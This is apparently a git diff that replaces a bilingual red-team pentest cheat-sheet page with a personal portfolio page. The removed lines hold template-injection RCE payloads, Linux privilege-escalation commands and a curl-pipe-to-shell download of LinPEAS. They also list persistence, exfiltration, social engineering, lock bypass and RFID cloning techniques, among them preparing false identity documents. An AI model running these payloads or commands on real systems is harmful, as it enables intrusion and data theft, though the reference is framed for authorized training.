-<span class="str">${7*7}</span>       <span class="com"># FreeMarker → 49</span>
-<span class="str">#{7*7}</span>       <span class="com"># Ruby ERB → 49</span>
-<span class="str">{{7*'7'}}</span>    <span class="com"># Jinja2 → 7777777, Twig → 49</span>
-
-<span class="com"># Jinja2 RCE payload</span>
-<span class="str">{{config.__class__.__init__.__globals__['os'].popen('id').read()}}</span>
-
-<span class="com"># Twig RCE payload</span>
-<span class="str">{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</span>
-
-<span class="com"># FreeMarker RCE</span>
-<span class="str">&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ ex("id")}</span></div>
-      </div>
-    </div>
-
-    <!-- ═══════════════════════════════════════════════════ POST-EXPLOIT -->
-    <div class="section" id="sec-postex">
-      <div class="section-header">
-        <div class="section-title"><span>//</span> <span data-en="POST-EXPLOITATION" data-id="PASCA-EKSPLOITASI">POST-EXPLOITATION</span></div>
-        <div class="section-badge">PERSISTENCE · PRIVESC · EXFIL</div>
-      </div>
-      <div class="cat-grid">
-        <div class="tool-card">
-          <div class="card-header"><div class="card-icon">⬆️</div><div class="card-name">PRIVESC (LINUX)</div><div class="card-tag tag-post">POST-EX</div></div>
-          <div class="card-body">
-            <div class="card-desc" data-en="Privilege escalation techniques from regular user to root on Linux."
-                 data-id="Teknik eskalasi hak akses dari user biasa ke root di sistem Linux.">
-              Privilege escalation techniques from regular user to root on Linux.
-            </div>
-            <ul class="card-items">
-              <li><code>sudo -l</code> — <span data-en="Check passwordless sudo commands" data-id="Cek perintah sudo tanpa password">Check passwordless sudo commands</span></li>
-              <li><code>find / -perm -4000 2>/dev/null</code> — <span data-en="SUID binaries" data-id="Binary SUID">SUID binaries</span></li>
-              <li data-en="LinPEAS / LinEnum — Automated privesc checker" data-id="LinPEAS / LinEnum — Pemeriksa privesc otomatis">LinPEAS / LinEnum — Automated privesc checker</li>
-              <li data-en="GTFOBins — SUID/sudo binary exploitation" data-id="GTFOBins — Eksploitasi binary SUID/sudo">GTFOBins — SUID/sudo binary exploitation</li>
-              <li data-en="Cron job abuse — Writable script executed by root" data-id="Penyalahgunaan cron job — Skrip writable yang dieksekusi root">Cron job abuse — Writable script executed by root</li>
-              <li data-en="Kernel exploit — Dirty COW, PwnKit, DirtyPipe" data-id="Exploit kernel — Dirty COW, PwnKit, DirtyPipe">Kernel exploit — Dirty COW, PwnKit, DirtyPipe</li>
-            </ul>
-          </div>
-        </div>
-        <div class="tool-card">
-          <div class="card-header"><div class="card-icon">🪟</div><div class="card-name">PRIVESC (WINDOWS)</div><div class="card-tag tag-post">POST-EX</div></div>
-          <div class="card-body">
-            <div class="card-desc" data-en="Privilege escalation in Windows & Active Directory environments."
-                 data-id="Eskalasi hak akses di lingkungan Windows & Active Directory.">
-              Privilege escalation in Windows &amp; Active Directory environments.
-            </div>
-            <ul class="card-items">
-              <li data-en="WinPEAS — Automated Windows privesc enumeration" data-id="WinPEAS — Enumerasi privesc Windows otomatis">WinPEAS — Automated Windows privesc enumeration</li>
-              <li data-en="BloodHound — AD attack path visualization" data-id="BloodHound — Visualisasi jalur serangan AD">BloodHound — AD attack path visualization</li>
-              <li data-en="Mimikatz — LSASS dump, pass-the-hash" data-id="Mimikatz — Dump LSASS, pass-the-hash">Mimikatz — LSASS dump, pass-the-hash</li>
-              <li data-en="Token impersonation — Juicy Potato, PrintSpoofer" data-id="Peniruan token — Juicy Potato, PrintSpoofer">Token impersonation — Juicy Potato, PrintSpoofer</li>
-              <li data-en="AlwaysInstallElevated — MSI install escalation" data-id="AlwaysInstallElevated — Eskalasi via MSI">AlwaysInstallElevated — MSI install escalation</li>
-            </ul>
-          </div>
-        </div>
-        <div class="tool-card">
-          <div class="card-header"><div class="card-icon">👁️</div><div class="card-name">PERSISTENCE</div><div class="card-tag tag-post">POST-EX</div></div>
-          <div class="card-body">
-            <div class="card-desc" data-en="Persistence techniques after successful exploitation."
-                 data-id="Teknik persistensi akses setelah exploit berhasil.">
-              Persistence techniques after successful exploitation.
-            </div>
-            <ul class="card-items">
-              <li data-en="Linux: crontab, ~/.bashrc, /etc/rc.local, systemd service" data-id="Linux: crontab, ~/.bashrc, /etc/rc.local, layanan systemd">Linux: crontab, ~/.bashrc, /etc/rc.local, systemd service</li>
-              <li data-en="SSH key injection into ~/.ssh/authorized_keys" data-id="Injeksi SSH key ke ~/.ssh/authorized_keys">SSH key injection into ~/.ssh/authorized_keys</li>
-              <li data-en="Windows: Registry Run keys, Scheduled Tasks" data-id="Windows: Registry Run keys, Tugas Terjadwal">Windows: Registry Run keys, Scheduled Tasks</li>
-              <li data-en="Windows: WMI Event Subscription, DLL hijacking" data-id="Windows: Langganan WMI Event, DLL hijacking">Windows: WMI Event Subscription, DLL hijacking</li>
-              <li data-en="Web shell in webserver directory" data-id="Web shell di direktori webserver">Web shell in webserver directory</li>
-            </ul>
-          </div>
-        </div>
-        <div class="tool-card">
-          <div class="card-header"><div class="card-icon">📤</div><div class="card-name">DATA EXFILTRATION</div><div class="card-tag tag-post">POST-EX</div></div>
-          <div class="card-body">
-            <div class="card-desc" data-en="Silently extract data bypassing DLP & monitoring systems."
-                 data-id="Mengekstraksi data secara diam-diam melewati DLP & monitoring.">
-              Silently extract data bypassing DLP &amp; monitoring systems.
-            </div>
-            <ul class="card-items">
-              <li data-en="DNS exfiltration — Data encoded in DNS queries" data-id="Eksfiltrasi DNS — Data dikodekan dalam query DNS">DNS exfiltration — Data encoded in DNS queries</li>
-              <li data-en="ICMP tunneling — Data in ICMP echo packets" data-id="Tunneling ICMP — Data dalam paket ICMP echo">ICMP tunneling — Data in ICMP echo packets</li>
-              <li data-en="HTTPS to C2 — Encrypted traffic to C2 server" data-id="HTTPS ke C2 — Traffic terenkripsi ke server C2">HTTPS to C2 — Encrypted traffic to C2 server</li>
-              <li data-en="Steganography — Data hidden in images/audio" data-id="Steganografi — Data tersembunyi dalam gambar/audio">Steganography — Data hidden in images/audio</li>
-              <li data-en="Cloud storage — Upload to Dropbox, Google Drive" data-id="Penyimpanan cloud — Upload ke Dropbox, Google Drive">Cloud storage — Upload to Dropbox, Google Drive</li>
-            </ul>
-          </div>
-        </div>
-      </div>
-      <div class="payload-block">
-        <div class="payload-header"><span class="payload-label">LINUX PRIVESC — QUICK COMMANDS</span><button class="copy-btn" onclick="copyPayload(this)" data-en="COPY" data-id="SALIN">COPY</button></div>
-        <div class="payload-code"><span class="com"># System enumeration</span>
-id; whoami; uname -a; cat /etc/os-release
-cat /etc/passwd | grep -v nologin
-ss -tlnp 2>/dev/null || netstat -tlnp
-
-<span class="com"># SUID binaries</span>
-find / -perm -4000 -type f 2>/dev/null
-
-<span class="com"># Writable directories</span>
-find / -writable -type d 2>/dev/null | grep -v proc
-
-<span class="com"># Check sudo rights</span>
-sudo -l
-
-<span class="com"># Cron jobs</span>
-crontab -l; ls -la /etc/cron*; cat /etc/crontab
-
-<span class="com"># Download LinPEAS and run</span>
-curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</div>
-      </div>
-    </div>
-
-    <!-- ═══════════════════════════════════════════════════ PHYSICAL -->
-    <div class="section" id="sec-physical">
-      <div class="section-header">
-        <div class="section-title"><span>//</span> <span data-en="PHYSICAL SECURITY" data-id="KEAMANAN FISIK">PHYSICAL SECURITY</span></div>
-        <div class="section-badge">SOCIAL ENG · LOCK · RFID</div>
-      </div>
-      <div class="alert-box warn">
-        <span>⚠</span>
-        <span data-en="Physical penetration testing MUST be conducted with very explicit written authorization. Without permission, all actions below constitute serious criminal offenses."
-              data-id="Physical penetration testing WAJIB dilakukan dengan otorisasi tertulis yang sangat jelas. Tanpa izin, semua tindakan berikut adalah tindak pidana berat.">
-          Physical penetration testing MUST be conducted with very explicit written authorization. Without permission, all actions below constitute serious criminal offenses.
-        </span>
-      </div>
-      <div class="cat-grid">
-        <div class="tool-card">
-          <div class="card-header"><div class="card-icon">🎭</div><div class="card-name">SOCIAL ENGINEERING</div><div class="card-tag tag-physical">PHYSICAL</div></div>
-          <div class="card-body">
-            <div class="card-desc" data-en="Psychological manipulation to obtain access or information from target individuals."
-                 data-id="Manipulasi psikologis untuk mendapatkan akses atau informasi dari target manusia.">
-              Psychological manipulation to obtain access or information from target individuals.
-            </div>
-            <ul class="card-items">
-              <li data-en="Pretexting — Build convincing false scenarios" data-id="Pretexting — Membangun skenario palsu yang meyakinkan">Pretexting — Build convincing false scenarios</li>
-              <li data-en="Phishing — Fake email/SMS with high urgency" data-id="Phishing — Email/SMS palsu dengan urgensi tinggi">Phishing — Fake email/SMS with high urgency</li>
-              <li data-en="Vishing — Phone impersonation of IT support or vendor" data-id="Vishing — Telepon impersonasi IT support atau vendor">Vishing — Phone impersonation of IT support or vendor</li>
-              <li data-en="Baiting — USB drop with malware at target location" data-id="Baiting — USB drop dengan malware di lokasi target">Baiting — USB drop with malware at target location</li>
-              <li data-en="Tailgating — Follow employee through access-controlled door" data-id="Tailgating — Ikut masuk di belakang karyawan">Tailgating — Follow employee through access-controlled door</li>
-              <li data-en="Quid Pro Quo — Trade technical help for access" data-id="Quid Pro Quo — Tukar bantuan teknis dengan akses">Quid Pro Quo — Trade technical help for access</li>
-            </ul>
-          </div>
-        </div>
-        <div class="tool-card">
-          <div class="card-header"><div class="card-icon">🔐</div><div class="card-name">LOCK BYPASS</div><div class="card-tag tag-physical">PHYSICAL</div></div>
-          <div class="card-body">
-            <div class="card-desc" data-en="Physical lock bypass techniques to gain entry into restricted areas."
-                 data-id="Teknik bypass kunci fisik untuk masuk ke area terlarang.">
-              Physical lock bypass techniques to gain entry into restricted areas.
-            </div>
-            <ul class="card-items">
-              <li data-en="Lock picking — Single pin picking (SPP), raking" data-id="Lock picking — Single pin picking (SPP), raking">Lock picking — Single pin picking (SPP), raking</li>
-              <li data-en="Bump key — Special key with impulse strike" data-id="Bump key — Kunci khusus dengan pukulan berimpuls">Bump key — Special key with impulse strike</li>
-              <li data-en="Bypass tools — Loiding card, shimming padlocks" data-id="Alat bypass — Loiding card, shimming gembok">Bypass tools — Loiding card, shimming padlocks</li>
-              <li data-en="Under-door tool — Manipulate door lever from below" data-id="Alat bawah pintu — Manipulasi tuas pintu dari bawah">Under-door tool — Manipulate door lever from below</li>
-              <li data-en="Crash bar defeat — Bypass exit hardware from outside" data-id="Bypass crash bar — Lewati hardware pintu darurat dari luar">Crash bar defeat — Bypass exit hardware from outside</li>
-            </ul>
-          </div>
-        </div>
-        <div class="tool-card">
-          <div class="card-header"><div class="card-icon">📡</div><div class="card-name">RFID / ACCESS CARD</div><div class="card-tag tag-physical">PHYSICAL</div></div>
-          <div class="card-body">
-            <div class="card-desc" data-en="Cloning and bypassing RFID card access systems."
-                 data-id="Kloning dan bypass sistem akses kartu RFID.">
-              Cloning and bypassing RFID card access systems.
-            </div>
-            <ul class="card-items">
-              <li data-en="Proxmark3 — Universal RFID tool (read, clone, emulate)" data-id="Proxmark3 — Alat RFID universal (baca, clone, emulasi)">Proxmark3 — Universal RFID tool (read, clone, emulate)</li>
-              <li data-en="Flipper Zero — Multi-tool: RFID, NFC, Sub-GHz" data-id="Flipper Zero — Multi-tool: RFID, NFC, Sub-GHz">Flipper Zero — Multi-tool: RFID, NFC, Sub-GHz</li>
-              <li data-en="ACR122U — NFC reader/writer for Mifare cards" data-id="ACR122U — Pembaca/penulis NFC untuk kartu Mifare">ACR122U — NFC reader/writer for Mifare cards</li>
-              <li data-en="HID Prox cloning — EM4100 125kHz clone attack" data-id="Kloning HID Prox — Serangan clone EM4100 125kHz">HID Prox cloning — EM4100 125kHz clone attack</li>
-              <li data-en="MiFare Classic — Default key attack (mfcuk, mfoc)" data-id="MiFare Classic — Serangan kunci default (mfcuk, mfoc)">MiFare Classic — Default key attack (mfcuk, mfoc)</li>
-            </ul>
-          </div>
-        </div>
-        <div class="tool-card">
-          <div class="card-header"><div class="card-icon">💻</div><div class="card-name">ROGUE HARDWARE</div><div class="card-tag tag-physical">PHYSICAL</div></div>
-          <div class="card-body">
-            <div class="card-desc" data-en="Malicious hardware devices implanted to gain persistent access."
-                 data-id="Perangkat hardware berbahaya yang ditanam untuk mendapatkan akses persisten.">
-              Malicious hardware devices implanted to gain persistent access.
-            </div>
-            <ul class="card-items">
-              <li data-en="Raspberry Pi — Covert network implant" data-id="Raspberry Pi — Implan jaringan tersembunyi">Raspberry Pi — Covert network implant</li>
-              <li data-en="LAN Turtle — Network implant in USB adapter" data-id="LAN Turtle — Implan jaringan dalam adaptor USB">LAN Turtle — Network implant in USB adapter</li>
-              <li data-en="WiFi Pineapple — Rogue AP & traffic interception" data-id="WiFi Pineapple — AP jahat & intersepsi traffic">WiFi Pineapple — Rogue AP &amp; traffic interception</li>
-              <li data-en="Bash Bunny — Multi-payload USB attack platform" data-id="Bash Bunny — Platform serangan USB multi-payload">Bash Bunny — Multi-payload USB attack platform</li>
-              <li data-en="O.MG Cable — Malicious charging cable with WiFi" data-id="O.MG Cable — Kabel pengisi daya berbahaya dengan WiFi">O.MG Cable — Malicious charging cable with WiFi</li>
-            </ul>
-          </div>
-        </div>
-        <div class="tool-card">
-          <div class="card-header"><div class="card-icon">📷</div><div class="card-name">SURVEILLANCE BYPASS</div><div class="card-tag tag-physical">PHYSICAL</div></div>
-          <div class="card-body">
-            <div class="card-desc" data-en="Operating under CCTV and surveillance systems." data-id="Beroperasi di bawah sistem pengawasan CCTV.">Operating under CCTV and surveillance systems.</div>
-            <ul class="card-items">
-              <li data-en="Camera blind spot mapping before operation" data-id="Pemetaan titik buta kamera sebelum operasi">Camera blind spot mapping before operation</li>
-              <li data-en="CCTV system assessment — DVR brand default credentials" data-id="Penilaian sistem CCTV — Kredensial default DVR">CCTV system assessment — DVR brand default credentials</li>
-              <li data-en="Timing attack — Enter during guard blind spot" data-id="Serangan waktu — Masuk saat titik buta petugas">Timing attack — Enter during guard blind spot</li>
-              <li data-en="Motion sensor bypass — Slow deliberate movement" data-id="Bypass sensor gerak — Gerakan lambat dan terarah">Motion sensor bypass — Slow deliberate movement</li>
-            </ul>
-          </div>
-        </div>
-        <div class="tool-card">
-          <div class="card-header"><div class="card-icon">🗑️</div><div class="card-name">DUMPSTER DIVING</div><div class="card-tag tag-osint">OSINT</div></div>
-          <div class="card-body">
-            <div class="card-desc" data-en="Gathering intelligence from material discarded by the target." data-id="Pengumpulan informasi dari material yang dibuang oleh target.">Gathering intelligence from material discarded by the target.</div>
-            <ul class="card-items">
-              <li data-en="Internal documents, memos, and discarded reports" data-id="Dokumen internal, memo, dan laporan yang dibuang">Internal documents, memos, and discarded reports</li>
-              <li data-en="Old hardware — HDDs, USBs with residual data" data-id="Hardware lama — HDD, USB dengan data residual">Old hardware — HDDs, USBs with residual data</li>
-              <li data-en="Post-it notes, lost access badges" data-id="Post-it notes, access badge yang hilang">Post-it notes, lost access badges</li>
-              <li data-en="Forms with names, roles, internal numbers" data-id="Formulir berisi nama, jabatan, nomor internal">Forms with names, roles, internal numbers</li>
-              <li data-en="Printer output — Configs, password sheets" data-id="Output printer — Konfigurasi, lembar password">Printer output — Configs, password sheets</li>
-            </ul>
-          </div>
-        </div>
-      </div>
-      <div class="grid2">
-        <div class="checklist">
-          <div class="checklist-title" data-en="PRE-ENGAGEMENT CHECKLIST" data-id="DAFTAR PRA-PENUGASAN">PRE-ENGAGEMENT CHECKLIST</div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Signed scope of work from both parties" data-id="Lingkup kerja ditandatangani kedua pihak">Signed scope of work from both parties</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Get-out-of-jail letter received from client" data-id="Surat perlindungan hukum dari klien diterima">Get-out-of-jail letter received from client</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="24/7 client emergency contact available" data-id="Kontak darurat klien tersedia 24/7">24/7 client emergency contact available</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Physical boundaries clearly defined" data-id="Batas area fisik telah didefinisikan">Physical boundaries clearly defined</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Allowed & forbidden actions defined" data-id="Tindakan yang diizinkan & tidak didefinisikan">Allowed &amp; forbidden actions defined</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Operation time window agreed upon" data-id="Jendela waktu operasi disepakati">Operation time window agreed upon</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Authorization proof carried during operation" data-id="Bukti otorisasi dibawa saat operasi">Authorization proof carried during operation</span></div>
-        </div>
-        <div class="checklist">
-          <div class="checklist-title" data-en="SOCIAL ENGINEERING PREP" data-id="PERSIAPAN REKAYASA SOSIAL">SOCIAL ENGINEERING PREP</div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Pretext story prepared & rehearsed" data-id="Cerita pretext disiapkan & dilatih">Pretext story prepared &amp; rehearsed</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="False identity documents prepared" data-id="Dokumen identitas palsu disiapkan">False identity documents prepared</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Internal company knowledge studied" data-id="Pengetahuan internal perusahaan dipelajari">Internal company knowledge studied</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Key employee names known" data-id="Nama karyawan kunci diketahui">Key employee names known</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Exit plan prepared if compromised" data-id="Exit plan disiapkan jika ketahuan">Exit plan prepared if compromised</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Covert recording device ready" data-id="Perangkat perekam tersembunyi siap">Covert recording device ready</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Attire/appearance matches pretext" data-id="Pakaian/penampilan sesuai pretext">Attire/appearance matches pretext</span></div>
-        </div>
-      </div>
-    </div>
-
-    <!-- ═══════════════════════════════════════════════════ CHECKLIST -->
-    <div class="section" id="sec-checklist">
-      <div class="section-header">
-        <div class="section-title"><span>//</span> PENTEST CHECKLIST</div>
-        <div class="section-badge" data-en="ENGAGEMENT TRACKER" data-id="PELACAK PENUGASAN">ENGAGEMENT TRACKER</div>
-      </div>
-      <div class="alert-box info" style="justify-content:space-between;align-items:center;">
-        <span><span data-en="PROGRESS" data-id="PROGRES">PROGRESS</span> · <b data-check-count>0/0</b></span>
-        <span style="flex:1;max-width:360px;"><span class="check-meter" style="margin-top:0;display:block;"><i></i></span></span>
-      </div>
-      <div class="cat-grid">
-        <div class="checklist">
-          <div class="checklist-title" data-en="📋 RECON PHASE" data-id="📋 FASE PENGINTAIAN">📋 RECON PHASE</div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Passive DNS enumeration complete" data-id="Enumerasi DNS pasif selesai">Passive DNS enumeration complete</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Subdomain brute force complete" data-id="Brute force subdomain selesai">Subdomain brute force complete</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Shodan/Censys search complete" data-id="Pencarian Shodan/Censys selesai">Shodan/Censys search complete</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Google dork search complete" data-id="Pencarian Google dork selesai">Google dork search complete</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Email harvesting complete" data-id="Pemanenan email selesai">Email harvesting complete</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="GitHub/Pastebin leak check complete" data-id="Pemeriksaan kebocoran GitHub/Pastebin selesai">GitHub/Pastebin leak check complete</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="WHOIS & registrar info collected" data-id="Info WHOIS & registrar dikumpulkan">WHOIS &amp; registrar info collected</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="LinkedIn OSINT complete" data-id="OSINT LinkedIn selesai">LinkedIn OSINT complete</span></div>
-        </div>
-        <div class="checklist">
-          <div class="checklist-title" data-en="🔍 SCANNING PHASE" data-id="🔍 FASE PEMINDAIAN">🔍 SCANNING PHASE</div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Full port scan of all target IPs" data-id="Scan port penuh semua IP target">Full port scan of all target IPs</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Service version detection complete" data-id="Deteksi versi layanan selesai">Service version detection complete</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="OS fingerprinting complete" data-id="OS fingerprinting selesai">OS fingerprinting complete</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Web server scan (Nikto) complete" data-id="Scan web server (Nikto) selesai">Web server scan (Nikto) complete</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Directory brute force complete" data-id="Brute force direktori selesai">Directory brute force complete</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Vulnerability scan (Nessus/OpenVAS)" data-id="Scan kerentanan (Nessus/OpenVAS)">Vulnerability scan (Nessus/OpenVAS)</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="CMS scan if applicable" data-id="Scan CMS jika berlaku">CMS scan if applicable</span></div>
-        </div>
-        <div class="checklist">
-          <div class="checklist-title" data-en="💥 EXPLOITATION PHASE" data-id="💥 FASE EKSPLOITASI">💥 EXPLOITATION PHASE</div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="SQL injection test complete" data-id="Uji SQL injection selesai">SQL injection test complete</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="XSS test complete (reflected, stored, DOM)" data-id="Uji XSS selesai (reflected, stored, DOM)">XSS test complete (reflected, stored, DOM)</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Authentication bypass test complete" data-id="Uji bypass autentikasi selesai">Authentication bypass test complete</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="IDOR/Broken access control tested" data-id="IDOR/Kontrol akses rusak diuji">IDOR/Broken access control tested</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="File upload bypass test complete" data-id="Uji bypass upload file selesai">File upload bypass test complete</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="SSRF test complete" data-id="Uji SSRF selesai">SSRF test complete</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Default credentials check complete" data-id="Pemeriksaan kredensial default selesai">Default credentials check complete</span></div>
-        </div>
-        <div class="checklist">
-          <div class="checklist-title" data-en="🎯 POST-EXPLOITATION" data-id="🎯 PASCA-EKSPLOITASI">🎯 POST-EXPLOITATION</div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Local enumeration complete" data-id="Enumerasi lokal selesai">Local enumeration complete</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Privilege escalation attempted" data-id="Eskalasi hak akses dicoba">Privilege escalation attempted</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Credential harvesting complete" data-id="Pemanenan kredensial selesai">Credential harvesting complete</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Lateral movement attempted" data-id="Pergerakan lateral dicoba">Lateral movement attempted</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Persistence mechanism tested" data-id="Mekanisme persistensi diuji">Persistence mechanism tested</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Data exfiltration proof-of-concept" data-id="Bukti konsep eksfiltrasi data">Data exfiltration proof-of-concept</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Evidence & screenshots collected" data-id="Bukti & screenshot dikumpulkan">Evidence &amp; screenshots collected</span></div>
-        </div>
-        <div class="checklist">
-          <div class="checklist-title" data-en="📝 REPORTING" data-id="📝 PELAPORAN">📝 REPORTING</div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Executive summary written" data-id="Ringkasan eksekutif ditulis">Executive summary written</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Findings documented with evidence" data-id="Temuan didokumentasi dengan bukti">Findings documented with evidence</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="CVSS score calculated per finding" data-id="Skor CVSS dihitung per temuan">CVSS score calculated per finding</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Remediation recommendations written" data-id="Rekomendasi remediasi ditulis">Remediation recommendations written</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="PoC steps are reproducible" data-id="Langkah PoC dapat direproduksi">PoC steps are reproducible</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Risk rating defined" data-id="Tingkat risiko didefinisikan">Risk rating defined</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Final report delivered to client" data-id="Laporan final disampaikan ke klien">Final report delivered to client</span></div>
-        </div>
-        <div class="checklist">
-          <div class="checklist-title" data-en="🧹 CLEANUP" data-id="🧹 PEMBERSIHAN">🧹 CLEANUP</div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Web shells removed from server" data-id="Web shell dihapus dari server">Web shells removed from server</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Backdoor users deleted" data-id="User backdoor dihapus">Backdoor users deleted</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Added SSH keys removed" data-id="SSH key yang ditambah dihapus">Added SSH keys removed</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Scheduled tasks/cron removed" data-id="Tugas terjadwal/cron dihapus">Scheduled tasks/cron removed</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Uploaded tools removed" data-id="Tools yang diupload dihapus">Uploaded tools removed</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Access logs during pentest documented" data-id="Log akses selama pentest didokumentasi">Access logs during pentest documented</span></div>
-          <div class="check-item"><div class="check-box" onclick="toggleCheck(this)"></div><span data-en="Client confirmed system back to normal" data-id="Klien konfirmasi sistem normal kembali">Client confirmed system back to normal</span></div>
-        </div>
-      </div>
-    </div>
-
-  </div><!-- .content-area -->
+  </section>
 </main>
 
 <footer>
-  <span>RED TEAM OPS</span> // TACTICAL RESOURCE HUB // v3.7.0
-  <span style="color:var(--text-dim)" data-en="FOR AUTHORIZED USE ONLY // © 2024 ETHICAL HACKING REFERENCE" data-id="HANYA UNTUK PENGGUNAAN RESMI // © 2024 REFERENSI ETHICAL HACKING">FOR AUTHORIZED USE ONLY // © 2024 ETHICAL HACKING REFERENCE</span>
-  <span data-en="⚠ LEGAL USE ONLY ⚠" data-id="⚠ HANYA PENGGUNAAN LEGAL ⚠">⚠ LEGAL USE ONLY ⚠</span>
+  <div class="wrap">
+    <div>© <span id="year"></span> Delfi Fikri Mukarom · <a href="https://github.com/delfiboyz/delfiboyz.github.io" target="_blank" rel="noopener">source</a></div>
+    <div><a href="https://github.com/delfiboyz" target="_blank" rel="noopener">github.com/delfiboyz</a></div>
+  </div>
 </footer>
 
 <script>
-  /* ── CLOCK ── */
-  function updateClock(){document.getElementById('clock').textContent=new Date().toTimeString().split(' ')[0];}
-  setInterval(updateClock,1000);updateClock();
+const GH = "https://github.com/delfiboyz/";
+const PAGES = "https://delfiboyz.github.io/";
 
-  /* ── NAVIGATION ── */
-  function showSection(id){
-    const target=document.getElementById('sec-'+id);
-    if(!target)return;
-    document.querySelectorAll('.section').forEach(s=>s.classList.remove('active'));
-    document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));
-    target.classList.add('active');
-    document.querySelectorAll('.nav-btn').forEach(b=>{
-      if(b.getAttribute('onclick')&&b.getAttribute('onclick').includes("'"+id+"'"))b.classList.add('active');
-    });
-    try{localStorage.setItem('rt_section',id);}catch(e){}
-    revealScan();                       // re-run scroll reveal for the newly shown section
-    document.getElementById('mainNav').classList.add('collapsed'); // close mobile menu
-    window.scrollTo({top:0,behavior:'smooth'});
-  }
+const CATEGORIES = {
+  web: "Web",
+  mobile: "Mobile",
+  game: "Game",
+  ai: "AI / ML",
+  security: "Security & Crypto",
+};
 
-  function toggleNav(){document.getElementById('mainNav').classList.toggle('collapsed');}
+// Proyek unggulan — disusun dari repositori asli (bukan fork) di github.com/delfiboyz
+const PROJECTS = [
+  {
+    repo: "PhoenixChat", title: "Phoenix Chat", cat: "mobile", year: 2026,
+    desc: "Aplikasi chat tanpa akun dan tanpa database. Identitas berupa kunci acak di perangkat, pesan dikirim langsung antar-perangkat lewat Tor onion service dengan enkripsi end-to-end. Tersedia versi desktop dan Android.",
+    tags: ["React", "Electron", "Kotlin", "Tor", "E2EE"],
+  },
+  {
